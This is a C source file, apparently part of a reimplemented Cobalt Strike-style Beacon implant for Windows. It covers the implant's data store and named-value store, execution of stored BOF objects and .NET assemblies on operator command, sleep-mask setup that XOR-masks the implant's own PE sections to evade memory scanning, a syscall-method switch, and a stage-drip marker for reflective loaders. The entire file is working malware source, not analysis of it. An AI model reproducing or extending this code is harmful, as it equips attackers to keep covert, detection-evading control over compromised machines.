#include <winsock2.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "datastore.h"
#include "gargleint.h"
#include "hostprof.h"
#include "syscalls.h"

extern char sleepmask_region[];

#define KV_SLOTS 64
#define DATASTORE_DEFAULT_SLOTS 16
#define DATASTORE_MAX_SLOTS 4096
#define ITEM_MASK_BYTE 0xA5

static int g_syscall_method;

typedef struct {
	char key[128];
	void * ptr;
	int used;
} kv_entry;

typedef struct {
	DATA_STORE_OBJECT obj;
	int occupied;
} ds_slot;

static kv_entry kv_table[KV_SLOTS];
static ds_slot * ds_slots;
static int ds_cap;
static unsigned char item_mask = ITEM_MASK_BYTE;

static void xor_buf(char * p, size_t n) {
	size_t i;
	if (p == NULL)
		return;
	for (i = 0; i < n; i++)
		p[i] = (char)(p[i] ^ item_mask);
}

static unsigned int hash_key(const char * key) {
	unsigned int h = 5381;
	int c;
	if (key == NULL)
		return 0;
	while ((c = (unsigned char)*key++) != 0)
		h = ((h << 5) + h) + c;
	return h;
}

static void put_be32(char * p, unsigned int v) {
	unsigned int n = htonl(v);
	memcpy(p, &n, 4);
}

static void put_be64(char * p, unsigned long long v) {
	put_be32(p, (unsigned int)(v >> 32));
	put_be32(p + 4, (unsigned int)v);
}

int syscall_method_get(void) {
	return g_syscall_method;
}

void syscall_method_set(int method) {
	if (method >= 0 && method <= 2)
		g_syscall_method = method;
}

void command_syscall_method_change(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	datap parser;
	int method;
	data_init(&parser, buffer, length);
	method = (int)data_int(&parser);
	syscall_method_set(method);
	command_syscall_method_query(callback);
}

void command_syscall_method_query(void (*callback)(char * buffer, int length, int type)) {
	int method = syscall_method_get();
	/* BeaconC2 reads CALLBACK_SYSCALL_METHOD as little-endian int */
	callback((char *)&method, (int)sizeof(method), CALLBACK_SYSCALL_METHOD);
}

static void datastore_free_slots(void) {
	int i;
	if (ds_slots == NULL)
		return;
	for (i = 0; i < ds_cap; i++) {
		if (ds_slots[i].occupied && ds_slots[i].obj.buffer != NULL) {
			memset(ds_slots[i].obj.buffer, 0, ds_slots[i].obj.length);
			free(ds_slots[i].obj.buffer);
		}
	}
	free(ds_slots);
	ds_slots = NULL;
	ds_cap = 0;
}

void datastore_reset_for_test(int slots) {
	int i;
	datastore_free_slots();
	memset(kv_table, 0, sizeof(kv_table));
	if (slots <= 0)
		slots = DATASTORE_DEFAULT_SLOTS;
	if (slots > DATASTORE_MAX_SLOTS)
		slots = DATASTORE_MAX_SLOTS;
	ds_cap = slots;
	ds_slots = (ds_slot *)malloc(sizeof(ds_slot) * ds_cap);
	if (ds_slots == NULL) {
		ds_cap = 0;
		return;
	}
	memset(ds_slots, 0, sizeof(ds_slot) * ds_cap);
	for (i = 0; i < ds_cap; i++)
		ds_slots[i].obj.type = DATA_STORE_TYPE_EMPTY;
}

/* C-56: pin the DRIPC201 stage-drip marker into the final image. The x86
 * linker dropped the unreferenced volatile array (x64 kept it); an active
 * relocation from this initializer pins it on every toolchain. */
/* C-56: DRIPC201 stage-drip marker, defined HERE (datastore.cpp is
 * compiled into every beacon variant) so no cross-TU linkage is involved
 * - the TS patches enable+delay into these bytes per-profile and the
 * reflective loaders find them by scanning the image (udrl/
 * ReflectiveLoader.c). The pin pointer references the array so no
 * config's /OPT:REF drops it (x86 lesson). Zeros = drip off. */
volatile unsigned char g_stage_drip[16] = {
	'D', 'R', 'I', 'P', 'C', '2', '0', '1',
	0, 0, 0, 0, /* enable (u32 LE) */
	0, 0, 0, 0  /* delay ms (u32 LE) */
};
volatile unsigned char *g_stage_drip_pin = g_stage_drip;

void cs49_apply_settings(void) {
	int n = (int)setting_int(SETTING_DATA_STORE_SIZE);
	g_syscall_method = (int)setting_int(SETTING_SYSCALL_METHOD);
	if (g_syscall_method < 0 || g_syscall_method > 2)
		g_syscall_method = 0;
	datastore_reset_for_test(n);
	hostprof_reload();
	syscalls_resolve();
	{
		char * res = setting_ptr(SETTING_BOF_RESOURCE);
		if (res != NULL && res[0] != '\0')
			BeaconAddValue("bof_res", res);
		else
			BeaconRemoveValue("bof_res");
	}
}

int datastore_add(int type, unsigned long long hash, char * data, int length) {
	int i;
	if (ds_slots == NULL || length < 0)
		return -1;
	for (i = 0; i < ds_cap; i++) {
		if (!ds_slots[i].occupied) {
			ds_slots[i].obj.type = type;
			ds_slots[i].obj.hash = (DWORD64)hash;
			ds_slots[i].obj.length = (size_t)length;
			ds_slots[i].obj.buffer = NULL;
			if (length > 0 && data != NULL) {
				ds_slots[i].obj.buffer = (char *)malloc((size_t)length);
				if (ds_slots[i].obj.buffer == NULL)
					return -1;
				memcpy(ds_slots[i].obj.buffer, data, (size_t)length);
				xor_buf(ds_slots[i].obj.buffer, (size_t)length);
				ds_slots[i].obj.masked = TRUE;
			}
			else {
				ds_slots[i].obj.masked = FALSE;
			}
			ds_slots[i].occupied = 1;
			return i;
		}
	}
	return -1;
}

int datastore_remove_at(int index) {
	if (ds_slots == NULL || index < 0 || index >= ds_cap || !ds_slots[index].occupied)
		return -1;
	if (ds_slots[index].obj.buffer != NULL) {
		memset(ds_slots[index].obj.buffer, 0, ds_slots[index].obj.length);
		free(ds_slots[index].obj.buffer);
	}
	memset(&ds_slots[index], 0, sizeof(ds_slot));
	ds_slots[index].obj.type = DATA_STORE_TYPE_EMPTY;
	return index;
}

unsigned long long datastore_hash_at(int index) {
	if (ds_slots == NULL || index < 0 || index >= ds_cap || !ds_slots[index].occupied)
		return 0;
	return (unsigned long long)ds_slots[index].obj.hash;
}

int datastore_type_at(int index) {
	if (ds_slots == NULL || index < 0 || index >= ds_cap || !ds_slots[index].occupied)
		return DATA_STORE_TYPE_EMPTY;
	return ds_slots[index].obj.type;
}

PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index) {
	if (ds_slots == NULL || index >= (size_t)ds_cap || !ds_slots[index].occupied)
		return NULL;
	return &ds_slots[index].obj;
}

void BeaconDataStoreProtectItem(size_t index) {
	PDATA_STORE_OBJECT o = BeaconDataStoreGetItem(index);
	if (o == NULL || o->masked || o->buffer == NULL)
		return;
	xor_buf(o->buffer, o->length);
	o->masked = TRUE;
}

void BeaconDataStoreUnprotectItem(size_t index) {
	PDATA_STORE_OBJECT o = BeaconDataStoreGetItem(index);
	if (o == NULL || !o->masked || o->buffer == NULL)
		return;
	xor_buf(o->buffer, o->length);
	o->masked = FALSE;
}

size_t BeaconDataStoreMaxEntries(void) {
	return (size_t)ds_cap;
}

/* 4.9 Beacon User Data: a UDRL may pass a small (32-byte) custom buffer
 * through the USER_DATA structure with DllMain reason DLL_BEACON_USER_DATA
 * (0x0d), before DLL_PROCESS_ATTACH. Beacon copies what it needs during the
 * call, so a static copy is the whole story. */
static char g_custom_user_data[32];
static int  g_custom_user_data_set = 0;

void BeaconSetUserDataSyscalls(const void * table);
extern void syscalls_apply_udrl_table(const void * table);

void BeaconSetUserDataSyscalls(const void * table) {
	syscalls_apply_udrl_table(table);
}

void BeaconSetCustomUserData(const void * data) {
	if (data == NULL)
		return;
	memcpy(g_custom_user_data, data, sizeof(g_custom_user_data));
	g_custom_user_data_set = 1;
}

char * BeaconGetCustomUserData(void) {
	return g_custom_user_data_set ? g_custom_user_data : NULL;
}

BOOL BeaconAddValue(const char * key, void * ptr) {
	int i;
	int empty = -1;
	unsigned int h;
	if (key == NULL)
		return FALSE;
	h = hash_key(key);
	for (i = 0; i < KV_SLOTS; i++) {
		if (kv_table[i].used && hash_key(kv_table[i].key) == h && strcmp(kv_table[i].key, key) == 0) {
			kv_table[i].ptr = ptr;
			return TRUE;
		}
		if (!kv_table[i].used && empty < 0)
			empty = i;
	}
	if (empty < 0)
		return FALSE;
	memset(kv_table[empty].key, 0, sizeof(kv_table[empty].key));
	strncpy(kv_table[empty].key, key, sizeof(kv_table[empty].key) - 1);
	kv_table[empty].ptr = ptr;
	kv_table[empty].used = 1;
	return TRUE;
}

void * BeaconGetValue(const char * key) {
	int i;
	if (key == NULL)
		return NULL;
	for (i = 0; i < KV_SLOTS; i++) {
		if (kv_table[i].used && strcmp(kv_table[i].key, key) == 0)
			return kv_table[i].ptr;
	}
	return NULL;
}

BOOL BeaconRemoveValue(const char * key) {
	int i;
	if (key == NULL)
		return FALSE;
	for (i = 0; i < KV_SLOTS; i++) {
		if (kv_table[i].used && strcmp(kv_table[i].key, key) == 0) {
			memset(&kv_table[i], 0, sizeof(kv_entry));
			return TRUE;
		}
	}
	return FALSE;
}

static char * g_sm_exec;
static DWORD g_sm_text;
static DWORD g_sm_total;

void beacon_sleep_mask_set_exec(char * ptr, DWORD text_size, DWORD total_size) {
	g_sm_exec = ptr;
	g_sm_text = text_size;
	g_sm_total = total_size;
}

/* The kit's sleepmask masks what this describes: in the PURPOSE_BEACON_MEMORY
 * region, .text through mask_text_section (it flips RX -> RW itself when
 * MaskSection is set), every other flagged section only while it is
 * writable, plus the heap records. Protections are read off the live image
 * so a mask decides exactly as it would with the official Beacon. The
 * region's Cleanup stays FALSE: our exit path frees what it tracks itself
 * before ExitThread, and the image is not the kit's to release. */
void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD sm_total)
{
	unsigned char * base = (unsigned char *)get_beacon_ptr();
	ALLOCATED_MEMORY_REGION * reg;
	ALLOCATED_MEMORY_SECTION * s;
	MEMORY_BASIC_INFORMATION mbi;
	IMAGE_NT_HEADERS * nt;
	IMAGE_SECTION_HEADER * sec;
	int i, n;

	if (info == NULL)
		return;
	memset(info, 0, sizeof(BEACON_INFO));
	info->version = 0x041300;
	info->sleep_mask_ptr = sm_base != NULL ? sm_base : sleepmask_region;
	info->sleep_mask_text_size = sm_text != 0 ? sm_text : SLEEPMASK_REGION_PATCH;
	info->sleep_mask_total_size = sm_total != 0 ? sm_total : SLEEPMASK_REGION_PATCH;
	info->beacon_ptr = (char *)base;
	info->heap_records = track_memory_get_heap_records_to_mask();
	gargle_mask_bytes(info->mask, MASK_SIZE);

	reg = &info->allocatedMemory.AllocatedMemoryRegions[0];
	reg->Purpose = AM_PURPOSE_BEACON_MEMORY;
	reg->AllocationBase = base;
	reg->CleanupInformation.AllocationMethod = AM_METHOD_VIRTUALALLOC;

	if (base == NULL || base[0] != 'M' || base[1] != 'Z')
		return;
	nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return;
	reg->RegionSize = nt->OptionalHeader.SizeOfImage;
	if (VirtualQuery(base, &mbi, sizeof(mbi)) == sizeof(mbi))
		reg->Type = mbi.Type;

	/* the header page: described as it is - read-only, so the kit's XOR
	 * leaves it alone */
	s = &reg->Sections[0];
	s->Label = AM_LABEL_PEHEADER;
	s->BaseAddress = base;
	s->VirtualSize = nt->OptionalHeader.SizeOfHeaders;
	s->MaskSection = FALSE;
	if (VirtualQuery(base, &mbi, sizeof(mbi)) == sizeof(mbi))
		s->CurrentProtect = mbi.Protect;

	sec = IMAGE_FIRST_SECTION(nt);
	for (i = 0, n = 1; i < nt->FileHeader.NumberOfSections && n < 8; i++, sec++) {
		unsigned char * p = base + sec->VirtualAddress;
		if (VirtualQuery(p, &mbi, sizeof(mbi)) != sizeof(mbi))
			continue;
		s = &reg->Sections[n];
		s->BaseAddress = p;
		s->VirtualSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
		s->CurrentProtect = mbi.Protect;
		if (memcmp(sec->Name, ".text", 6) == 0) {
			s->Label = AM_LABEL_TEXT;
			s->MaskSection = TRUE;
		}
		else if (memcmp(sec->Name, ".rdata", 7) == 0) {
			s->Label = AM_LABEL_RDATA;
			s->MaskSection = TRUE;
		}
		else if (memcmp(sec->Name, ".data", 6) == 0) {
			s->Label = AM_LABEL_DATA;
			s->MaskSection = TRUE;
		}
		else if (memcmp(sec->Name, ".pdata", 7) == 0) {
			s->Label = AM_LABEL_PDATA;
			s->MaskSection = FALSE;
		}
		else if (memcmp(sec->Name, ".reloc", 7) == 0) {
			s->Label = AM_LABEL_RELOC;
			s->MaskSection = FALSE;
		}
		else {
			s->Label = AM_LABEL_EMPTY;
			s->MaskSection = FALSE;
		}
		n++;
	}
}

BOOL BeaconInformation(BEACON_INFO * info)
{
	beacon_info_fill(info, g_sm_exec, g_sm_text, g_sm_total);
	return TRUE;
}

void command_data_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	datap parser;
	int sub;
	data_init(&parser, buffer, length);
	sub = (int)data_int(&parser);
	KD("ds: enter length=", (long)length);
	KD("ds: sub=", (long)sub);
	if (sub == 1) {
		int type = (int)data_int(&parser);
		unsigned long long hash = data_long(&parser);
		datap_buffer blob = data_extract(&parser);
		KD("ds: add type=", (long)type);
		KD("ds: add hash=", (long)(hash & 0x7fffffff));
		KD("ds: add bloblen=", (long)blob.length);
		KD("ds: add blobptr=", (long)(size_t)blob.buffer);
		int idx = datastore_add(type, hash, blob.buffer, blob.length);
		KD("ds: add idx=", (long)idx);
		char out[12];
		if (idx < 0) {
			post_error_na(0x0d);
			return;
		}
		/* tier-2 item6: a UDC2 BOF upload (magic header) also lands in
		 * the named-value store so udc2_init can engage the channel.
		 * BeaconAddValue keeps the pointer - copy off the transient task
		 * buffer (the wire buffer is wiped after the task). */
		if (blob.length > 12 && *(int *)blob.buffer == 0x32434455) {
			char * keep = (char *)malloc(blob.length);
			if (keep != NULL) {
				memcpy(keep, blob.buffer, blob.length);
				BeaconAddValue("udc2", keep);
			}
		}
		put_be32(out, (unsigned int)idx);
		put_be64(out + 4, hash);
		callback(out, 12, CALLBACK_DATA_STORE_ADD);
	}
	else if (sub == 2) {
		int idx = (int)data_int(&parser);
		char out[4];
		if (datastore_remove_at(idx) < 0) {
			post_error_d(0x0d, idx);
			return;
		}
		put_be32(out, (unsigned int)idx);
		callback(out, 4, CALLBACK_DATA_STORE_REMOVE);
	}
	else if (sub == 3) {
		int i, n = 0;
		char * out;
		int off;
		KD("ds: list sub reached", 0x7fffffff);
		if (ds_slots == NULL)
			return;
		for (i = 0; i < ds_cap; i++) {
			if (ds_slots[i].occupied)
				n++;
		}
		out = (char *)malloc((size_t)(4 + n * 12));
		if (out == NULL)
			return;
		put_be32(out, (unsigned int)n);
		off = 4;
		for (i = 0; i < ds_cap; i++) {
			if (!ds_slots[i].occupied)
				continue;
			put_be64(out + off, (unsigned long long)ds_slots[i].obj.hash);
			put_be32(out + off + 8, (unsigned int)ds_slots[i].obj.type);
			off += 12;
		}
		callback(out, off, CALLBACK_DATA_STORE_LIST);
		free(out);
	}
}

static char * datastore_unwrap_bof(PDATA_STORE_OBJECT item, int * outlen) {
	unsigned int cmd, sz;
	char * p;
	int n;
	if (item == NULL || item->buffer == NULL)
		return NULL;
	p = item->buffer;
	n = (int)item->length;
	if (n >= 8) {
		memcpy(&cmd, p, 4);
		memcpy(&sz, p + 4, 4);
		cmd = ntohl(cmd);
		sz = ntohl(sz);
		if (cmd == 100 && sz + 8 <= (unsigned int)n) {
			*outlen = (int)sz;
			return p + 8;
		}
	}
	*outlen = n;
	return p;
}

void command_data_store_inline_execute(char * buffer, int length) {
	datap parser;
	int index;
	DWORD entry;
	datap_buffer args;
	PDATA_STORE_OBJECT item;
	char * obj;
	int objlen;
	data_init(&parser, buffer, length);
	index = (int)data_int(&parser);
	entry = data_int(&parser);
	args = data_extract(&parser);
	BeaconDataStoreUnprotectItem((size_t)index);
	item = BeaconDataStoreGetItem((size_t)index);
	if (item == NULL) {
		post_error_d(0x0d, index);
		return;
	}
	obj = datastore_unwrap_bof(item, &objlen);
	if (obj == NULL) {
		BeaconDataStoreProtectItem((size_t)index);
		return;
	}
	command_inline_execute_object_parsed(obj, objlen, entry, args.buffer, args.length, 0);
	BeaconDataStoreProtectItem((size_t)index);
}

void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
	datap parser;
	int index;
	datap_buffer jobblob;
	datap_buffer extra;
	PDATA_STORE_OBJECT item;
	datap job;
	DWORD jtype, wait, offset, dlen;
	char desc[64];
	char * dll;
	int dlllen;
	unsigned int inner_type;
	(void)x86;
	(void)ignoreToken;
	data_init(&parser, buffer, length);
	index = (int)data_int(&parser);
	jobblob = data_extract(&parser);
	extra = data_extract(&parser);
	BeaconDataStoreUnprotectItem((size_t)index);
	item = BeaconDataStoreGetItem((size_t)index);
	if (item == NULL || item->buffer == NULL || jobblob.length < 8) {
		post_error_d(0x0d, index);
		BeaconDataStoreProtectItem((size_t)index);
		return;
	}
	memcpy(&inner_type, jobblob.buffer, 4);
	inner_type = ntohl(inner_type);
	data_init(&job, jobblob.buffer + 8, jobblob.length - 8);
	jtype = data_short(&job);
	wait = data_short(&job);
	offset = data_int(&job);
	memset(desc, 0, sizeof(desc));
	dlen = data_string(&job, desc, 64);
	/* Store item is ExecuteAssemblyJob.getDataStoreObject():
	 *   addLengthAndString(invokeassembly DLL) + addInt(asmLen)+asm
	 * Cmd extra is getArgument()'s trailing wide args only.
	 * Job parameter must be [len][assembly][wide args], not extra alone. */
	{
		datap stored;
		char * rest;
		int restlen;
		char * param;
		int plen;

		data_init(&stored, item->buffer, (int)item->length);
		dlllen = (int)data_int(&stored);
		dll = data_ptr(&stored, dlllen);
		if (dll == NULL) {
			BeaconDataStoreProtectItem((size_t)index);
			return;
		}
		rest = data_buffer(&stored);
		restlen = data_length(&stored);
		plen = restlen + extra.length;
		param = NULL;
		if (plen > 0) {
			param = (char *)malloc((size_t)plen);
			if (param == NULL) {
				BeaconDataStoreProtectItem((size_t)index);
				return;
			}
			if (restlen > 0)
				memcpy(param, rest, (size_t)restlen);
			if (extra.length > 0 && extra.buffer != NULL)
				memcpy(param + restlen, extra.buffer, (size_t)extra.length);
		}
		x86 = (inner_type == 70 || inner_type == 87);
		ignoreToken = (inner_type == 70 || inner_type == 71);
		command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, param, (DWORD)plen, desc, dlen, x86, ignoreToken);
		free(param);
	}
	BeaconDataStoreProtectItem((size_t)index);
}
